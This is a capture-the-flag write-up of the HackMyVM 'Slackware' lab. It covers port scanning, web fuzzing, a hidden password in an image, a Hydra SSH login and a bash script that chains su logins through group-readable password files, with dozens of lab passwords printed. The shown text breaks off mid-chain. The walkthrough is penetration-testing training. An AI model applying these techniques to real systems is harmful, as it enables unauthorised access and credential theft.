# Slackware

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Slackware | kerszi | Beginner | HackMyVM |

**Summary:** The exploitation of the Slackware machine was a multi-stage operation that began with a comprehensive scan revealing services on nonstandard ports, including SSH on port 1 and Apache on port 2. Initial web reconnaissance through directory fuzzing led to the discovery of a split 7zip archive. An initial attempt to extract the first part failed, which prompted a targeted fuzzing attack to locate all fourteen parts of the archive. Upon reconstruction, the archive yielded a PNG image that contained both visual and steganographic clues. Visual identification of the subject as Patrick Volkerding allowed for the generation of a targeted username list, while string analysis of the image file provided a hidden password. These credentials facilitated initial access via SSH. The internal phase involved a massive lateral movement challenge where a chain of over fifty users was traversed using a custom automation script that exploited group based read permissions on password files. The final escalation was achieved by identifying steganographic white space within a user flag file, which revealed the root password and allowed for the retrieval of the final flag hidden within a configuration file.

---

**Reconnaissance**

The engagement began with the identification of the target machine on the local network. A custom PowerShell script was executed to perform a ping sweep and vendor identification.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.185 08:00:27:2A:5B:55 VirtualBox
```

With the target IP identified as 192.168.100.185, a full port Nmap scan was conducted. The results indicated that the system was running SSH on port 1 and a web server on port 2, diverging from standard port assignments.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ nmap -sV -sC -p- 192.168.100.185 -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 09:41 WIB
Nmap scan report for 192.168.100.185
Host is up (0.0025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT  STATE SERVICE VERSION
1/tcp open  ssh     OpenSSH 9.3 (protocol 2.0)
| ssh-hostkey:
|   256 e2:66:60:79:bc:d1:33:2e:c1:25:fa:99:e5:89:1e:d3 (ECDSA)
|_  256 98:59:c3:a8:2b:89:56:77:eb:72:4a:05:90:21:cb:40 (ED25519)
2/tcp open  http    Apache httpd 2.4.58 ((Unix))
|_http-server-header: Apache/2.4.58 (Unix)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Tribute to Slackware

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds
```

**Web Enumeration**

The investigation shifted to the web server on port 2. Directory enumeration using Gobuster revealed several standard files, including a robots.txt file that contained a critical hint regarding a split archive.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ gobuster dir -u http://192.168.100.185:2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.185:2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 199]
/.htaccess.php        (Status: 403) [Size: 199]
/.htaccess.txt        (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htpasswd.txt        (Status: 403) [Size: 199]
/.htpasswd.html       (Status: 403) [Size: 199]
/.htpasswd.php        (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.hta.php             (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.hta.html            (Status: 403) [Size: 199]
/.hta.txt             (Status: 403) [Size: 199]
/cgi-bin/.html        (Status: 403) [Size: 199]
/index.html           (Status: 200) [Size: 7511]
/index.html           (Status: 200) [Size: 7511]
/robots.txt           (Status: 200) [Size: 21]
/robots.txt           (Status: 200) [Size: 21]
Progress: 19000 / 19000 (100.00%)
===============================================================
Finished
===============================================================

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ curl http://192.168.100.185:2/robots.txt
User-agent: *
#7z.001 
```

Utilizing the hint from robots.txt, additional fuzzing with ffuf was performed. A directory named getslack was identified, followed by the discovery of a file named twitter.7z.001 within that directory.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ ffuf -u http://192.168.100.185:2/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs 199 -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.185:2/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 199
________________________________________________

                        [Status: 200, Size: 7511, Words: 921, Lines: 169, Duration: 10ms]
                        [Status: 200, Size: 7511, Words: 921, Lines: 169, Duration: 22ms]
getslack                [Status: 301, Size: 242, Words: 14, Lines: 8, Duration: 15ms]
:: Progress: [220546/220546] :: Job [1/1] :: 1626 req/sec :: Duration: [0:02:02] :: Errors: 0 ::

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ ffuf -u http://192.168.100.185:2/getslack/FUZZ.7z.001 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.185:2/getslack/FUZZ.7z.001
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

twitter                 [Status: 200, Size: 20480, Words: 84, Lines: 81, Duration: 75ms]
:: Progress: [220546/220546] :: Job [1/1] :: 1886 req/sec :: Duration: [0:02:04] :: Errors: 0 ::
```

An initial attempt to extract the single downloaded part failed because the file was part of a larger multi-volume set. This necessitated further fuzzing to identify all fourteen components of the archive.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ ffuf -u http://192.168.100.185:2/getslack/twitter.7z.FUZZ -w <(seq -w 1 100) -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.185:2/getslack/twitter.7z.FUZZ
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

001                     [Status: 200, Size: 20480, Words: 84, Lines: 81, Duration: 8ms]
002                     [Status: 200, Size: 20480, Words: 79, Lines: 69, Duration: 16ms]
003                     [Status: 200, Size: 20480, Words: 78, Lines: 92, Duration: 17ms]
004                     [Status: 200, Size: 20480, Words: 93, Lines: 77, Duration: 16ms]
013                     [Status: 200, Size: 20480, Words: 96, Lines: 58, Duration: 19ms]
012                     [Status: 200, Size: 20480, Words: 81, Lines: 67, Duration: 21ms]
008                     [Status: 200, Size: 20480, Words: 78, Lines: 84, Duration: 37ms]
014                     [Status: 200, Size: 1860, Words: 9, Lines: 9, Duration: 68ms]
011                     [Status: 200, Size: 20480, Words: 83, Lines: 63, Duration: 70ms]
005                     [Status: 200, Size: 20480, Words: 85, Lines: 69, Duration: 71ms]
007                     [Status: 200, Size: 20480, Words: 93, Lines: 70, Duration: 73ms]
009                     [Status: 200, Size: 20480, Words: 84, Lines: 66, Duration: 82ms]
006                     [Status: 200, Size: 20480, Words: 74, Lines: 68, Duration: 83ms]
010                     [Status: 200, Size: 20480, Words: 90, Lines: 77, Duration: 86ms]
:: Progress: [100/100] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Once all parts were downloaded and combined, the archive was successfully extracted.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ for i in $(seq -w 001 014); do wget http://192.168.100.185:2/getslack/twitter.7z.$i; done
--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.001
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.001’

twitter.7z.001  100%[=====>]  20.00K  --.-KB/s    in 0s

2026-05-10 10:23:25 (42.8 MB/s) - ‘twitter.7z.001’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.002
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.002’

twitter.7z.002  100%[=====>]  20.00K  --.-KB/s    in 0.001s

2026-05-10 10:23:25 (25.1 MB/s) - ‘twitter.7z.002’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.003
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.003’

twitter.7z.003  100%[=====>]  20.00K  --.-KB/s    in 0.001s

2026-05-10 10:23:25 (27.6 MB/s) - ‘twitter.7z.003’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.004
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.004’

twitter.7z.004  100%[=====>]  20.00K  --.-KB/s    in 0.001s

2026-05-10 10:23:25 (21.8 MB/s) - ‘twitter.7z.004’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.005
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.005’

twitter.7z.005  100%[=====>]  20.00K  --.-KB/s    in 0.001s

2026-05-10 10:23:25 (17.7 MB/s) - ‘twitter.7z.005’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.006
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.006’

twitter.7z.006  100%[=====>]  20.00K  --.-KB/s    in 0.001s

2026-05-10 10:23:25 (25.4 MB/s) - ‘twitter.7z.006’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.007
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.007’

twitter.7z.007  100%[=====>]  20.00K  --.-KB/s    in 0.004s

2026-05-10 10:23:25 (5.02 MB/s) - ‘twitter.7z.007’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.008
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.008’

twitter.7z.008  100%[=====>]  20.00K  --.-KB/s    in 0.002s

2026-05-10 10:23:25 (9.93 MB/s) - ‘twitter.7z.008’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.009
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.009’

twitter.7z.009  100%[=====>]  20.00K  --.-KB/s    in 0s

2026-05-10 10:23:25 (49.4 MB/s) - ‘twitter.7z.009’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.010
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.010’

twitter.7z.010  100%[=====>]  20.00K  --.-KB/s    in 0.002s

2026-05-10 10:23:25 (12.9 MB/s) - ‘twitter.7z.010’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.011
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.011’

twitter.7z.011  100%[=====>]  20.00K  --.-KB/s    in 0.001s

2026-05-10 10:23:25 (26.0 MB/s) - ‘twitter.7z.011’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.012
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.012’

twitter.7z.012  100%[=====>]  20.00K  --.-KB/s    in 0s

2026-05-10 10:23:25 (252 MB/s) - ‘twitter.7z.012’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.013
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.013’

twitter.7z.013  100%[=====>]  20.00K  --.-KB/s    in 0.001s

2026-05-10 10:23:25 (19.1 MB/s) - ‘twitter.7z.013’ saved [20480/20480]

--2026-05-10 10:23:25--  http://192.168.100.185:2/getslack/twitter.7z.014
Connecting to 192.168.100.185:2... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1860 (1.8K) [application/x-7z-compressed]
Saving to: ‘twitter.7z.014’

twitter.7z.014  100%[=====>]   1.82K  --.-KB/s    in 0s

2026-05-10 10:23:25 (44.0 MB/s) - ‘twitter.7z.014’ saved [1860/1860]

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ 7z x twitter.7z.001

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:10240, ASM

Scanning the drive for archives:
1 file, 20480 bytes (20 KiB)

Extracting archive: twitter.7z.001
--
Path = twitter.7z.001
Type = Split
Physical Size = 20480
Volumes = 14
Total Physical Size = 268100
----
Path = twitter.7z
Size = 268100
--
Path = twitter.7z
Type = 7z
Physical Size = 268100
Headers Size = 130
Method = LZMA2:384k
Solid = -
Blocks = 1

Everything is Ok

Size:       267951
Compressed: 268100
```

**Initial Access**

The extraction yielded a file named twitter.png. Analysis with the strings utility revealed a password hidden at the end of the image data.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ strings twitter.png
IHDR
|iCCPicc
!Iqq
...
"0LXb
jevl
IEND
trYth1sPasS1993
```

The image was then visually identified as Patrick Volkerding, the founder of the Slackware Linux distribution.

![image.png](image.png)

A targeted username list was generated based on this identity using username-anarchy.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ username-anarchy Patrick Volkerding > ./users.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ cat users.txt
patrick
patrickvolkerding
patrick.volkerding
patrickv
patrvolk
p.volkerding
pvolkerding
vpatrick
v.patrick
volkerdingp
volkerding
volkerding.p
volkerding.patrick
pv
```

SSH authentication attempts were made using Hydra, which successfully identified the correct credentials for the user patrick.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ hydra -L users.txt -p trYth1sPasS1993 ssh://192.168.100.185:1
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-10 10:28:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:14/p:1), ~1 try per task
[DATA] attacking ssh://192.168.100.185:1/
[1][ssh] host: 192.168.100.185   login: patrick   password: trYth1sPasS1993
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-10 10:28:31
```

Initial access was established via SSH on port 1.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slackware]
└─$ ssh patrick@192.168.100.185 -p 1
The authenticity of host '[192.168.100.185]:1 ([192.168.100.185]:1)' can't be established.
ED25519 key fingerprint is: SHA256:m/iaIzavXraumIPoCQReEwCgahrbGQe8WpPXO8nfAqE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.100.185]:1' (ED25519) to the list of known hosts.
(patrick@192.168.100.185) Password:
Linux 5.15.145.
patrick@slackware:~$ id
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),1001(kretinga)
```

**Lateral Movement**

Internal enumeration revealed an extensive list of users and a peculiar permission structure. Each user belonged to a group named after a subsequent user, granting them read access to a mypass.txt file in the next user's home directory.

```bash
patrick@slackware:~$ ls -la /home/kretinga/
total 9
drwxr-x---  2 kretinga patrick   112 Mar 10  2024 ./
drwxr-xr-x 54 root     root     1400 Mar 10  2024 ../
-rw-r--r--  1 kretinga kretinga 3729 Feb  2  2022 .screenrc
-rw-r-----  1 kretinga patrick    13 Mar 10  2024 mypass.txt
patrick@slackware:~$ cat /home/kretinga/mypass.txt
lpV8UG0GxKuw
```

To automate the traversal of this lengthy chain, a bash script was developed to dynamically identify the next target and authenticate as them.

```bash
patrick@slackware:~$ cat /tmp/x.sh
#!/bin/bash

# Get the name of this script automatically
SCRIPT_PATH="$(realpath "$0")"

while true; do
    curr=$(whoami)
    # Find the next target based on group permissions
    next=$(find /home -maxdepth 1 -type d -group "$curr" -not -name "$curr" -exec stat -c "%U" {} \;)

    if [ -z "$next" ]; then
        echo "------------------------------------------------"
        echo "!!! Chain ended or reached the final user: $curr"
        echo "------------------------------------------------"
        # Look for a flag or interesting files in the final home dir
        ls -la ~
        break
    fi

    # Read the password for the next user
    pass_file="/home/$next/mypass.txt"
    if [ -r "$pass_file" ]; then
        pass=$(cat "$pass_file")

        echo "------------------------------------------------"
        echo "CURRENT USER : $curr"
        echo "NEXT TARGET  : $next"
        echo "PASSWORD     : $pass"
        echo "------------------------------------------------"
        echo "1. Copy the password above."
        echo "2. Press ENTER to initiate 'su'."
        echo "3. Paste the password when prompted."
        read -p ""

        # Execute su and immediately run this same script as the new user
        su - $next -c "bash $SCRIPT_PATH"

        # After you 'exit' from the last user, this will break the loop
        break
    else
        echo "[!] Permissions block: $curr cannot read $pass_file"
        break
    fi
done
```

The script was executed, successfully pivoting through a massive number of accounts.

```bash
patrick@slackware:~$ /tmp/x.sh
------------------------------------------------
CURRENT USER : patrick
NEXT TARGET  : kretinga
PASSWORD     : lpV8UG0GxKuw
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : kretinga
NEXT TARGET  : claor
PASSWORD     : JRksNe5rWgis
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : claor
NEXT TARGET  : alienum
PASSWORD     : ex0XVRAAjCWX
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : alienum
NEXT TARGET  : mrmidnight
PASSWORD     : B4ReHPEhmlPt
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : mrmidnight
NEXT TARGET  : annlynn
PASSWORD     : S64IamSERUI3
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : annlynn
NEXT TARGET  : powerful
PASSWORD     : pof2XIpVzYl3
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : powerful
NEXT TARGET  : proxy
PASSWORD     : GX2xnNNU2Hcc
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : proxy
NEXT TARGET  : x4v1l0k
PASSWORD     : TB7pVPwPUeIW
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : x4v1l0k
NEXT TARGET  : icex64
PASSWORD     : tX5o7AUg2PTd
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : icex64
NEXT TARGET  : mindsflee
PASSWORD     : VZFoxk0lqnnc
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : mindsflee
NEXT TARGET  : zacarx007
PASSWORD     : 8LCa5IDAELR4
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : zacarx007
NEXT TARGET  : terminal
PASSWORD     : Qv0dtvZdfpvN
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : terminal
NEXT TARGET  : zenmpi
PASSWORD     : WiEbQP6K4Sg9
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : zenmpi
NEXT TARGET  : sml
PASSWORD     : AQewY20VryO7
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : sml
NEXT TARGET  : emvee
PASSWORD     : sj5mu74Nmowb
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : emvee
NEXT TARGET  : nls
PASSWORD     : VfS9EIU5C9xw
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : nls
NEXT TARGET  : noname
PASSWORD     : 0Vsok2PoVo7t
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : noname
NEXT TARGET  : nolose
PASSWORD     : KcHXtRsiUPpw
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : nolose
NEXT TARGET  : sancelisso
PASSWORD     : oAGSK1zXcbT8
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : sancelisso
NEXT TARGET  : ruycr4ft
PASSWORD     : G5UJEpW78pOV
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : ruycr4ft
NEXT TARGET  : tasiyanci
PASSWORD     : JO8dvF60MdXR
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : tasiyanci
NEXT TARGET  : lanz
PASSWORD     : IBrVGveXM3jI
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : lanz
NEXT TARGET  : pylon
PASSWORD     : 6Mqoo8Pud4Fx
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : pylon
NEXT TARGET  : wwfymn
PASSWORD     : VBebiyG62uIg
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : wwfymn
NEXT TARGET  : whitecr0wz
PASSWORD     : 51BwJ9iYO4E7
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : whitecr0wz
NEXT TARGET  : bit
PASSWORD     : fDZRz4SJOs8z
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : bit
NEXT TARGET  : infayerts
PASSWORD     : NYURcD5V8k4X
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : infayerts
NEXT TARGET  : rijaba1
PASSWORD     : eaqz8vJ2pRmU
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : rijaba1
NEXT TARGET  : cromiphi
PASSWORD     : CQBpV2NQ3U6A
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : cromiphi
NEXT TARGET  : gatogamer
PASSWORD     : yjwGMry82S2Y
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : gatogamer
NEXT TARGET  : ch4rm
PASSWORD     : Hz35MslshyXj
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : ch4rm
NEXT TARGET  : aceomn
PASSWORD     : sXdnu8wF1Yb8
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : aceomn
NEXT TARGET  : kerszi
PASSWORD     : rjDwcHDFYBML
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : kerszi
NEXT TARGET  : d3b0o
PASSWORD     : oHjylQ7402Dd
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : d3b0o
NEXT TARGET  : avijneyam
PASSWORD     : vRdS8PLTnTlW
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : avijneyam
NEXT TARGET  : zayotic
PASSWORD     : bgg9TT9otdD6
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : zayotic
NEXT TARGET  : kaian
PASSWORD     : R23AJFVTQYaB
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : kaian
NEXT TARGET  : c4rta
PASSWORD     : IAuaOSSTZHoh
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : c4rta
NEXT TARGET  : boyras200
PASSWORD     : oW19TzLywNIq
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : boyras200
NEXT TARGET  : waidroc
PASSWORD     : 0aApTUf5E2Eq
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : waidroc
NEXT TARGET  : ziyos
PASSWORD     : 8eS8I1JGxeeZ
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : ziyos
NEXT TARGET  : b4el7d
PASSWORD     : llMttpVCiYPw
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : b4el7d
NEXT TARGET  : rpj7
PASSWORD     : wP26CtkDby6J
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
3. Paste the password when prompted.

Password:
------------------------------------------------
CURRENT USER : rpj7
NEXT TARGET  : h1dr0
PASSWORD     : tnvAny2zwYTV
------------------------------------------------
1. Copy the password above.
2. Press ENTER to initiate 'su'.
